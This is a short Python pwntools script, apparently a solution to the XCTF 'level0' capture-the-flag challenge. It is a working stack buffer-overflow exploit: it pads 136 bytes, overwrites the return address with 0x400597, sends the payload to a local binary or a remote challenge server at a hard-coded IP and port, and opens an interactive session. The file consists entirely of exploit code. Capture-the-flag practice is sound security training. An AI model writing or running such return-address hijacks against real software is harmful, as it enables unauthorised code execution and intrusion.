from pwn import *
from misc import utils

local = 1

if __name__ == "__main__":
    addr = '../../challenges/xctf/level0'
    ip = '111.200.241.244:65037'
    r = None
    if not local:
        r = remote(ip.split(':')[0], int(ip.split(':')[1]))
    else:
        r = process([addr])

    payload = b'A' * 128 + b'a' * 8 + p64(0x400597)  # ignore "push rbp"
    utils.write_bins(payload, 'level0_poc')

    r.sendline(payload)

    r.interactive()
